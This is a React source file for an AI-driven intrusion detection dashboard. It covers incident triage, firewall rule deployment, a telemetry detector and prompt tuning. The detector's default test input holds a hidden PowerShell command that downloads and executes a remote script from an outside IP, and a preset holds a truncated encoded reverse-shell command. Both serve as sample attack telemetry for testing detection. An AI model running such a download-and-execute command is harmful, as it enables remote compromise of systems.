import React, { useState, useEffect } from 'react';
import { 
  Zap, 
  Cpu, 
  Shield, 
  Terminal, 
  Sliders, 
  Copy, 
  Check, 
  RefreshCw, 
  Radio, 
  Activity, 
  AlertTriangle,
  Play
} from 'lucide-react';
import { useLocation } from 'react-router-dom';
import { 
  getAtriaConfig, 
  testAtriaGateway, 
  updateAtriaTraining, 
  detectTelemetryWithAtria, 
  analyzeIncidentWithAI, 
  getAlerts,
  containBlockIP,
  containBlockPort,
  containKillProcess
} from '../services/api';
import LoadingSpinner from '../components/LoadingSpinner';
import { motion, AnimatePresence } from 'framer-motion';

export default function AIDecisionCenter() {
  const location = useLocation();
  const passedIncident = location.state?.incident;

  // Active Tab: 'triage' | 'detector' | 'training'
  const [activeTab, setActiveTab] = useState('triage');

  // Atria Config & Connection State
  const [atriaConfig, setAtriaConfig] = useState(null);
  const [gatewayStatus, setGatewayStatus] = useState({
    connected: true,
    status: 'ONLINE',
    model: 'Atria-Dawn-Preview',
    latency_ms: 240
  });
  const [testingGateway, setTestingGateway] = useState(false);

  // Triage State
  const [alerts, setAlerts] = useState([]);
  const [selectedAlertId, setSelectedAlertId] = useState('');
  const [analyzing, setAnalyzing] = useState(false);
  const [aiDecision, setAiDecision] = useState(null);
  const [copiedRule, setCopiedRule] = useState(false);

  // Live Detector State
  const [testPayload, setTestPayload] = useState({
    source_ip: '185.220.101.5',
    target_port: 4444,
    protocol: 'TCP',
    process_name: 'powershell.exe',
    payload: 'powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.5/payload.ps1\')'
  });
  const [detecting, setDetecting] = useState(false);
  const [detectionResult, setDetectionResult] = useState(null);

  // Training Rules State
  const [systemPrompt, setSystemPrompt] = useState('');
  const [savingPrompt, setSavingPrompt] = useState(false);
  const [saveSuccess, setSaveSuccess] = useState(false);

  // Load initial data
  useEffect(() => {
    getAtriaConfig()
      .then((cfg) => {
        if (cfg) {
          setAtriaConfig(cfg);
          setSystemPrompt(cfg.system_prompt || '');
        }
      })
      .catch(console.error);

    getAlerts({ page: 1, page_size: 20 })
      .then((res) => {
        const items = res.items || [];
        setAlerts(items);
        if (items.length > 0 && !passedIncident) {
          setSelectedAlertId(items[0].id.toString());
        }
      })
      .catch(console.error);

    // Initial ping
    handlePingGateway();
  }, []);

  // Handle passed incident from notification or incident table
  useEffect(() => {
    if (passedIncident) {
      handleAnalyzeCustom(passedIncident);
    }
  }, [passedIncident]);

  const handlePingGateway = async () => {
    setTestingGateway(true);
    try {
      const res = await testAtriaGateway();
      setGatewayStatus(res);
    } catch (err) {
      setGatewayStatus({
        connected: false,
        status: 'OFFLINE',
        message: err?.response?.data?.detail || err.message
      });
    } finally {
      setTestingGateway(false);
    }
  };

  const handleAnalyzeAlert = async () => {
    if (!selectedAlertId) return;
    setAnalyzing(true);
    setAiDecision(null);
    try {
      const res = await analyzeIncidentWithAI({ alert_id: parseInt(selectedAlertId) });
      setAiDecision(res);
    } catch (err) {
      console.error(err);
    } finally {
      setAnalyzing(false);
    }
  };

  const handleAnalyzeCustom = async (incident) => {
    if (incident?.atria_deep_eval) {
      setAiDecision(incident.atria_deep_eval);
      return;
    }
    setAnalyzing(true);
    setAiDecision(null);
    try {
      const res = await analyzeIncidentWithAI({
        alert_id: incident.id ? parseInt(incident.id) : null,
        incident_data: incident
      });
      setAiDecision(res);
    } catch (err) {
      console.error(err);
    } finally {
      setAnalyzing(false);
    }
  };

  const handleRunDetector = async (e) => {
    e?.preventDefault();
    setDetecting(true);
    setDetectionResult(null);
    try {
      const res = await detectTelemetryWithAtria(testPayload);
      setDetectionResult(res);
    } catch (err) {
      console.error(err);
    } finally {
      setDetecting(false);
    }
  };

  const handleSavePrompt = async () => {
    setSavingPrompt(true);
    setSaveSuccess(false);
    try {
      const res = await updateAtriaTraining(systemPrompt, atriaConfig?.rules);
      setAtriaConfig(res);
      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 3000);
    } catch (err) {
      console.error(err);
    } finally {
      setSavingPrompt(false);
    }
  };

  const [deployingRule, setDeployingRule] = useState(false);
  const [deployFeedback, setDeployFeedback] = useState(null);

  const handleDeployFirewallLive = async () => {
    if (!aiDecision?.firewall_rule) return;
    setDeployingRule(true);
    setDeployFeedback(null);
    try {
      let ip = aiDecision.source_ip;
      let port = aiDecision.target_port;
      
      const ipMatch = aiDecision.firewall_rule.match(/remoteip=([0-9.]+)/i);
      if (ipMatch) ip = ipMatch[1];
      const portMatch = aiDecision.firewall_rule.match(/localport=([0-9]+)/i) || aiDecision.firewall_rule.match(/remoteport=([0-9]+)/i);
      if (portMatch) port = Number(portMatch[1]);

      let res;
      if (port && (!ip || ip.includes('127.0.0.1'))) {
        res = await containBlockPort({ port, alert_id: selectedAlertId ? Number(selectedAlertId) : undefined });
      } else if (ip && !ip.includes('127.0.0.1') && !ip.includes('::1')) {
        res = await containBlockIP({ ip, alert_id: selectedAlertId ? Number(selectedAlertId) : undefined });
      } else if (port) {
        res = await containBlockPort({ port, alert_id: selectedAlertId ? Number(selectedAlertId) : undefined });
      } else {
        setDeployFeedback({ success: false, message: 'No valid remote IP or port found in firewall syntax.' });
        return;
      }

      setDeployFeedback(res);
    } catch (err) {
      setDeployFeedback({ success: false, message: err.message });
    } finally {
      setDeployingRule(false);
    }
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedRule(true);
    setTimeout(() => setCopiedRule(false), 2000);
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Header Banner */}
      <div className="neu-flat rounded-[28px] p-6">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-blue-600 to-blue-500 text-white flex items-center justify-center shadow-[4px_4px_12px_rgba(37,99,235,0.35),-2px_-2px_8px_rgba(255,255,255,0.9)]">
              <Zap className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-3">
                <h1 className="text-xl font-bold text-slate-900 tracking-tight">
                  Atria AI Intelligence Center
                </h1>
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-blue-50 text-blue-700 border border-blue-200">
                  744B MoE Agentic
                </span>
              </div>
              <p className="text-xs text-slate-500 mt-0.5">
                Model: <span className="font-semibold text-slate-700">Atria-Dawn-Preview</span> • Real-time Cybersecurity Intrusion Detection & Automated Containment
              </p>
            </div>
          </div>

          {/* Atria Gateway Health & Ping */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-full neu-inset text-xs font-semibold">
              <span className={`w-2.5 h-2.5 rounded-full ${gatewayStatus?.connected ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-rose-500 shadow-[0_0_8px_rgba(244,63,94,0.7)]'}`} />
              <span className="text-slate-700">
                {gatewayStatus?.connected ? 'Atria Cloud Active' : 'Offline'}
              </span>
              {gatewayStatus?.latency_ms && (
                <span className="text-[10px] font-mono text-slate-400 border-l border-slate-300/50 pl-2">
                  {gatewayStatus.latency_ms}ms
                </span>
              )}
            </div>

            <button
              onClick={handlePingGateway}
              disabled={testingGateway}
              className="neu-button px-3.5 py-2 rounded-2xl text-xs font-bold flex items-center gap-1.5 transition-all text-slate-700 hover:text-blue-600 disabled:opacity-50"
              title="Ping Atria Gateway"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${testingGateway ? 'animate-spin text-blue-600' : ''}`} />
              <span>Ping</span>
            </button>
          </div>
        </div>

        {/* Soft UI Tab Navigation */}
        <div className="flex items-center gap-2 mt-6 pt-5 border-t border-slate-300/40">
          <button
            onClick={() => setActiveTab('triage')}
            className={`px-4 py-2 rounded-2xl text-xs font-bold transition-all flex items-center gap-2 ${
              activeTab === 'triage'
                ? 'neu-accent-btn'
                : 'neu-button text-slate-600 hover:text-slate-900'
            }`}
          >
            <Shield className="w-3.5 h-3.5" />
            <span>Incident Triage & Firewall</span>
          </button>

          <button
            onClick={() => setActiveTab('detector')}
            className={`px-4 py-2 rounded-2xl text-xs font-bold transition-all flex items-center gap-2 ${
              activeTab === 'detector'
                ? 'neu-accent-btn'
                : 'neu-button text-slate-600 hover:text-slate-900'
            }`}
          >
            <Activity className="w-3.5 h-3.5" />
            <span>Interactive Threat Detector</span>
          </button>

          <button
            onClick={() => setActiveTab('training')}
            className={`px-4 py-2 rounded-2xl text-xs font-bold transition-all flex items-center gap-2 ${
              activeTab === 'training'
                ? 'neu-accent-btn'
                : 'neu-button text-slate-600 hover:text-slate-900'
            }`}
          >
            <Sliders className="w-3.5 h-3.5" />
            <span>Detection Training & Prompt Tuning</span>
          </button>
        </div>
      </div>

      {/* TAB 1: INCIDENT TRIAGE & FIREWALL */}
      {activeTab === 'triage' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Incident Queue Selector */}
          <div className="lg:col-span-5 space-y-4">
            <div className="neu-flat rounded-[28px] p-6 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                  <Radio className="w-3.5 h-3.5 text-blue-600" />
                  Active Incident Stream
                </h3>
                <span className="text-[11px] font-semibold text-slate-500 font-mono">
                  {alerts.length} In Queue
                </span>
              </div>

              <div>
                <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1.5 ml-1">
                  Select Incident
                </label>
                <div className="neu-inset rounded-2xl px-3 py-2">
                  <select
                    value={selectedAlertId}
                    onChange={(e) => setSelectedAlertId(e.target.value)}
                    className="w-full bg-transparent border-none text-slate-900 font-bold focus:outline-none cursor-pointer text-xs"
                  >
                    {alerts.map((a) => (
                      <option key={a.id} value={a.id} className="bg-[#edf4f0]">
                        #{a.id} • [{a.risk_level}] {a.alert_type} ({a.attack_type || 'Unknown'})
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <button
                onClick={handleAnalyzeAlert}
                disabled={analyzing || !selectedAlertId}
                className="w-full neu-accent-btn py-3 rounded-2xl text-xs font-bold flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {analyzing ? (
                  <>
                    <LoadingSpinner size="sm" />
                    <span>Atria-Dawn Reasoning...</span>
                  </>
                ) : (
                  <>
                    <Zap className="w-4 h-4" />
                    <span>Analyze Incident with Atria AI</span>
                  </>
                )}
              </button>
            </div>

            {/* Quick Architecture Spec Card */}
            <div className="neu-flat rounded-[28px] p-5 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-slate-600">
                Atria-Dawn Intelligence Capabilities
              </h4>
              <ul className="space-y-2 text-xs text-slate-600">
                <li className="flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-blue-500 mt-1.5 shrink-0" />
                  <span><strong>Direct MITRE ATT&CK Mapping</strong> for instant tactic correlation.</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 mt-1.5 shrink-0" />
                  <span><strong>Zero-Configuration Firewall Defense</strong> generating exact Windows netsh commands.</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-indigo-500 mt-1.5 shrink-0" />
                  <span><strong>Chain-of-Thought SOC Reasoning</strong> analyzing attacker motive and blast radius.</span>
                </li>
              </ul>
            </div>
          </div>

          {/* AI Decision & Mitigation Output */}
          <div className="lg:col-span-7">
            <div className="neu-flat rounded-[28px] p-6 min-h-[460px] flex flex-col">
              <div className="flex items-center justify-between pb-4 mb-4 border-b border-slate-300/40">
                <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                  <Terminal className="w-3.5 h-3.5 text-blue-600" />
                  Atria Triage Decision & Containment Plan
                </h3>
                {aiDecision?.source && (
                  <span className="text-[10px] font-bold text-blue-700 bg-blue-50 px-2.5 py-0.5 rounded-full border border-blue-200">
                    {aiDecision.source}
                  </span>
                )}
              </div>

              {analyzing ? (
                <div className="flex-1 flex flex-col items-center justify-center py-16 space-y-3 text-center">
                  <LoadingSpinner size="lg" />
                  <p className="text-xs font-bold text-slate-700">Atria-Dawn MoE Model Triaging Incident...</p>
                  <p className="text-[11px] text-slate-400 max-w-xs">Synthesizing network telemetry, assessing risk level, and writing containment rules.</p>
                </div>
              ) : aiDecision ? (
                <div className="space-y-4 flex-1">
                  {/* Executive Assessment */}
                  <div className="neu-inset rounded-2xl p-4 space-y-1">
                    <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Threat Summary</span>
                    <p className="text-xs font-medium text-slate-800 leading-relaxed">
                      {aiDecision.threat_summary || aiDecision.summary}
                    </p>
                  </div>

                  {/* Root Cause & MITRE */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="neu-inset rounded-2xl p-3.5 space-y-1">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Root Cause Analysis</span>
                      <p className="text-xs text-slate-700 font-medium">
                        {aiDecision.root_cause_analysis || aiDecision.root_cause || 'Abnormal network signature detected.'}
                      </p>
                    </div>

                    <div className="neu-inset rounded-2xl p-3.5 space-y-1">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Immediate Action</span>
                      <p className="text-xs text-slate-700 font-medium">
                        {aiDecision.immediate_action || aiDecision.recommended_action || 'Quarantine host connection.'}
                      </p>
                    </div>
                  </div>

                  {/* Firewall Containment Command */}
                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-500">
                        Executable Windows Firewall Rule (netsh)
                      </span>
                      <div className="flex items-center gap-2">
                        {aiDecision.firewall_rule && aiDecision.firewall_rule !== 'None' && (
                          <button
                            onClick={handleDeployFirewallLive}
                            disabled={deployingRule}
                            className="px-3 py-1 rounded-xl text-[11px] font-bold bg-emerald-600 hover:bg-emerald-700 text-white flex items-center gap-1.5 transition-all shadow-sm disabled:opacity-50"
                          >
                            <Shield className={`w-3 h-3 ${deployingRule ? 'animate-spin' : ''}`} />
                            <span>{deployingRule ? 'Deploying...' : 'Deploy Firewall Live'}</span>
                          </button>
                        )}
                        {aiDecision.firewall_rule && (
                          <button
                            onClick={() => handleCopy(aiDecision.firewall_rule)}
                            className="text-[11px] font-bold text-blue-600 hover:text-blue-800 flex items-center gap-1 transition-colors"
                          >
                            {copiedRule ? <Check className="w-3 h-3 text-emerald-600" /> : <Copy className="w-3 h-3" />}
                            <span>{copiedRule ? 'Copied' : 'Copy'}</span>
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="neu-inset rounded-2xl p-3 font-mono text-xs text-slate-900 bg-[#e4ece7] select-all overflow-x-auto">
                      <code>{aiDecision.firewall_rule || 'None required for baseline traffic.'}</code>
                    </div>
                    {deployFeedback && (
                      <div className={`p-3 rounded-xl text-xs font-bold flex items-center gap-2 mt-2 ${
                        deployFeedback.success ? 'bg-emerald-50 text-emerald-800 border border-emerald-200' : 'bg-rose-50 text-rose-800 border border-rose-200'
                      }`}>
                        {deployFeedback.success ? <Check className="w-4 h-4 text-emerald-600 shrink-0" /> : <AlertTriangle className="w-4 h-4 text-rose-600 shrink-0" />}
                        <span>{deployFeedback.message}</span>
                      </div>
                    )}
                  </div>

                  {/* Long-term Strategy */}
                  {aiDecision.containment_strategy && (
                    <div className="neu-inset rounded-2xl p-3 space-y-1">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Hardening Strategy</span>
                      <p className="text-xs text-slate-600">
                        {aiDecision.containment_strategy}
                      </p>
                    </div>
                  )}
                </div>
              ) : (
                <div className="flex-1 flex flex-col items-center justify-center py-16 text-center space-y-2 text-slate-400">
                  <Shield className="w-10 h-10 stroke-1 text-slate-300" />
                  <p className="text-xs font-semibold">Select an incident from the queue and click "Analyze Incident with Atria AI"</p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: INTERACTIVE THREAT DETECTOR */}
      {activeTab === 'detector' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Input Form */}
          <div className="lg:col-span-6 space-y-4">
            <div className="neu-flat rounded-[28px] p-6 space-y-4">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                <Activity className="w-3.5 h-3.5 text-blue-600" />
                Live Telemetry Injection & Detection Test
              </h3>
              <p className="text-xs text-slate-500">
                Input any raw network packet, socket flow, or process event to test Atria AI's real-time detection accuracy.
              </p>

              <form onSubmit={handleRunDetector} className="space-y-3.5">
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1 ml-1">
                      Source IP
                    </label>
                    <div className="neu-inset rounded-2xl px-3 py-2">
                      <input
                        type="text"
                        value={testPayload.source_ip}
                        onChange={(e) => setTestPayload({ ...testPayload, source_ip: e.target.value })}
                        className="w-full bg-transparent border-none text-xs font-mono font-bold text-slate-900 focus:outline-none"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1 ml-1">
                      Target Port
                    </label>
                    <div className="neu-inset rounded-2xl px-3 py-2">
                      <input
                        type="number"
                        value={testPayload.target_port}
                        onChange={(e) => setTestPayload({ ...testPayload, target_port: parseInt(e.target.value) || 0 })}
                        className="w-full bg-transparent border-none text-xs font-mono font-bold text-slate-900 focus:outline-none"
                      />
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1 ml-1">
                      Protocol
                    </label>
                    <div className="neu-inset rounded-2xl px-3 py-2">
                      <select
                        value={testPayload.protocol}
                        onChange={(e) => setTestPayload({ ...testPayload, protocol: e.target.value })}
                        className="w-full bg-transparent border-none text-xs font-bold text-slate-900 focus:outline-none cursor-pointer"
                      >
                        <option value="TCP" className="bg-[#edf4f0]">TCP</option>
                        <option value="UDP" className="bg-[#edf4f0]">UDP</option>
                        <option value="ICMP" className="bg-[#edf4f0]">ICMP</option>
                      </select>
                    </div>
                  </div>

                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1 ml-1">
                      Process Name
                    </label>
                    <div className="neu-inset rounded-2xl px-3 py-2">
                      <input
                        type="text"
                        value={testPayload.process_name}
                        onChange={(e) => setTestPayload({ ...testPayload, process_name: e.target.value })}
                        className="w-full bg-transparent border-none text-xs font-mono font-bold text-slate-900 focus:outline-none"
                      />
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-[11px] font-bold uppercase tracking-wider text-slate-600 mb-1 ml-1">
                    Command / Packet Payload Snapshot
                  </label>
                  <div className="neu-inset rounded-2xl p-3">
                    <textarea
                      rows={3}
                      value={testPayload.payload}
                      onChange={(e) => setTestPayload({ ...testPayload, payload: e.target.value })}
                      className="w-full bg-transparent border-none text-xs font-mono text-slate-900 focus:outline-none resize-none"
                    />
                  </div>
                </div>

                {/* Preset Buttons */}
                <div className="flex items-center gap-2 pt-1">
                  <span className="text-[10px] font-bold uppercase text-slate-400">Presets:</span>
                  <button
                    type="button"
                    onClick={() => setTestPayload({
                      source_ip: '185.220.101.5',
                      target_port: 4444,
                      protocol: 'TCP',
                      process_name: 'powershell.exe',
                      payload: 'powershell.exe -nop -w hidden -e aQBlAHgA... (Reverse Shell)'
                    })}
                    className="text-[10px] font-semibold px-2 py-0.5 rounded-lg neu-button text-slate-600 hover:text-blue-600"
                  >
                    Meterpreter Shell
                  </button>
                  <button
                    type="button"
                    onClick={() => setTestPayload({
                      source_ip: '192.168.1.188',
                      target_port: 22,
                      protocol: 'TCP',
                      process_name: 'sshd.exe',
                      payload: 'Failed password for root from 192.168.1.188 (Repeated 45x)'
                    })}
                    className="text-[10px] font-semibold px-2 py-0.5 rounded-lg neu-button text-slate-600 hover:text-blue-600"
                  >
                    SSH Brute Force
                  </button>
                  <button
                    type="button"
                    onClick={() => setTestPayload({
                      source_ip: '10.0.0.12',
                      target_port: 443,
                      protocol: 'TCP',
                      process_name: 'chrome.exe',
                      payload: 'Standard HTTPS TLS 1.3 Handshake ClientHello'
                    })}
                    className="text-[10px] font-semibold px-2 py-0.5 rounded-lg neu-button text-slate-600 hover:text-blue-600"
                  >
                    Normal HTTPS
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={detecting}
                  className="w-full neu-accent-btn py-3 rounded-2xl text-xs font-bold flex items-center justify-center gap-2 disabled:opacity-50 mt-2"
                >
                  {detecting ? (
                    <>
                      <LoadingSpinner size="sm" />
                      <span>Atria AI Evaluating Packet...</span>
                    </>
                  ) : (
                    <>
                      <Play className="w-3.5 h-3.5" />
                      <span>Run Detection via Atria-Dawn-Preview</span>
                    </>
                  )}
                </button>
              </form>
            </div>
          </div>

          {/* Real-time Detection Output */}
          <div className="lg:col-span-6">
            <div className="neu-flat rounded-[28px] p-6 min-h-[460px] flex flex-col">
              <div className="flex items-center justify-between pb-4 mb-4 border-b border-slate-300/40">
                <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                  <Terminal className="w-3.5 h-3.5 text-blue-600" />
                  Atria AI Verdict & Telemetry Score
                </h3>
                {detectionResult?.analyzed_by && (
                  <span className="text-[10px] font-bold text-blue-700 bg-blue-50 px-2.5 py-0.5 rounded-full border border-blue-200">
                    {detectionResult.analyzed_by}
                  </span>
                )}
              </div>

              {detecting ? (
                <div className="flex-1 flex flex-col items-center justify-center py-16 space-y-3 text-center">
                  <LoadingSpinner size="lg" />
                  <p className="text-xs font-bold text-slate-700">Atria-Dawn-Preview Evaluating Telemetry...</p>
                  <p className="text-[11px] text-slate-400 max-w-xs">Comparing network flow against 744B MoE cybersecurity parameters.</p>
                </div>
              ) : detectionResult ? (
                <div className="space-y-4 flex-1">
                  {/* Verdict & Threat Badge */}
                  <div className="flex items-center justify-between p-4 rounded-2xl neu-inset">
                    <div>
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Verdict</span>
                      <div className="text-lg font-black tracking-tight text-slate-900 flex items-center gap-2 mt-0.5">
                        <span className={detectionResult.is_intrusion ? 'text-rose-600' : 'text-emerald-600'}>
                          {detectionResult.verdict || (detectionResult.is_intrusion ? 'ATTACK' : 'BENIGN')}
                        </span>
                        <span className="text-xs font-bold text-slate-500">
                          • {detectionResult.attack_type}
                        </span>
                      </div>
                    </div>

                    <div className="text-right">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Confidence</span>
                      <div className="text-base font-mono font-black text-blue-600">
                        {Math.round((detectionResult.confidence_score || 0.95) * 100)}%
                      </div>
                    </div>
                  </div>

                  {/* Summary */}
                  <div className="neu-inset rounded-2xl p-3.5 space-y-1">
                    <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Executive Summary</span>
                    <p className="text-xs text-slate-700 font-medium leading-relaxed">
                      {detectionResult.summary}
                    </p>
                  </div>

                  {/* MITRE & Recommended Action */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="neu-inset rounded-2xl p-3 space-y-0.5">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">MITRE Technique</span>
                      <p className="text-xs font-bold text-slate-800">
                        {detectionResult.mitre_technique || 'N/A'}
                      </p>
                    </div>

                    <div className="neu-inset rounded-2xl p-3 space-y-0.5">
                      <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Risk Level</span>
                      <p className={`text-xs font-black ${
                        detectionResult.threat_level === 'CRITICAL' ? 'text-rose-600' :
                        detectionResult.threat_level === 'HIGH' ? 'text-amber-600' : 'text-emerald-600'
                      }`}>
                        {detectionResult.threat_level}
                      </p>
                    </div>
                  </div>

                  {/* Firewall Defense Rule */}
                  {detectionResult.firewall_rule && detectionResult.firewall_rule !== 'None' && (
                    <div className="space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-bold uppercase tracking-wider text-slate-500">Generated Defense Rule</span>
                        <button
                          onClick={() => handleCopy(detectionResult.firewall_rule)}
                          className="text-[11px] font-bold text-blue-600 hover:text-blue-800 flex items-center gap-1"
                        >
                          {copiedRule ? <Check className="w-3 h-3 text-emerald-600" /> : <Copy className="w-3 h-3" />}
                          <span>{copiedRule ? 'Copied' : 'Copy'}</span>
                        </button>
                      </div>
                      <div className="neu-inset rounded-2xl p-3 font-mono text-xs text-slate-900 bg-[#e4ece7] select-all overflow-x-auto">
                        <code>{detectionResult.firewall_rule}</code>
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div className="flex-1 flex flex-col items-center justify-center py-16 text-center space-y-2 text-slate-400">
                  <Terminal className="w-10 h-10 stroke-1 text-slate-300" />
                  <p className="text-xs font-semibold">Enter telemetry parameters on the left and click "Run Detection via Atria-Dawn-Preview"</p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: PROMPT TRAINING & DETECTION RULES */}
      {activeTab === 'training' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Active Rules List */}
          <div className="lg:col-span-5 space-y-4">
            <div className="neu-flat rounded-[28px] p-6 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                  <Sliders className="w-3.5 h-3.5 text-blue-600" />
                  Trained Detection Rules
                </h3>
                <span className="text-[11px] font-bold text-blue-600">
                  {atriaConfig?.rules_count || 5} Active Rules
                </span>
              </div>

              <div className="space-y-2.5">
                {(atriaConfig?.rules || []).map((rule) => (
                  <div key={rule.id} className="p-3.5 rounded-2xl neu-inset space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-slate-800">{rule.name}</span>
                      <span className={`text-[9px] font-extrabold px-2 py-0.5 rounded-full ${
                        rule.severity === 'CRITICAL' ? 'bg-rose-100 text-rose-700' : 'bg-amber-100 text-amber-800'
                      }`}>
                        {rule.severity}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-500">{rule.description}</p>
                    <span className="text-[10px] font-mono text-slate-400">{rule.id}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* System Prompt Instruction Tuning */}
          <div className="lg:col-span-7">
            <div className="neu-flat rounded-[28px] p-6 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-600 flex items-center gap-2">
                    <Terminal className="w-3.5 h-3.5 text-blue-600" />
                    Atria AI System Prompt Training
                  </h3>
                  <p className="text-[11px] text-slate-500 mt-0.5">
                    This prompt is passed with every inference call to guide the 744B MoE model's cybersecurity detection logic.
                  </p>
                </div>
                {saveSuccess && (
                  <span className="text-xs font-bold text-emerald-600 flex items-center gap-1 bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
                    <Check className="w-3 h-3" /> Saved!
                  </span>
                )}
              </div>

              <div className="neu-inset rounded-2xl p-4">
                <textarea
                  rows={14}
                  value={systemPrompt}
                  onChange={(e) => setSystemPrompt(e.target.value)}
                  className="w-full bg-transparent border-none text-xs font-mono text-slate-900 focus:outline-none leading-relaxed"
                />
              </div>

              <div className="flex items-center justify-between pt-2">
                <button
                  type="button"
                  onClick={() => setSystemPrompt(atriaConfig?.system_prompt || '')}
                  className="neu-button px-4 py-2 rounded-2xl text-xs font-bold text-slate-600 hover:text-slate-900"
                >
                  Reset to Default
                </button>

                <button
                  type="button"
                  onClick={handleSavePrompt}
                  disabled={savingPrompt}
                  className="neu-accent-btn px-6 py-2.5 rounded-2xl text-xs font-bold flex items-center gap-2 disabled:opacity-50"
                >
                  {savingPrompt ? (
                    <>
                      <LoadingSpinner size="sm" />
                      <span>Updating Instructions...</span>
                    </>
                  ) : (
                    <>
                      <Check className="w-4 h-4" />
                      <span>Save & Apply Training Prompt</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
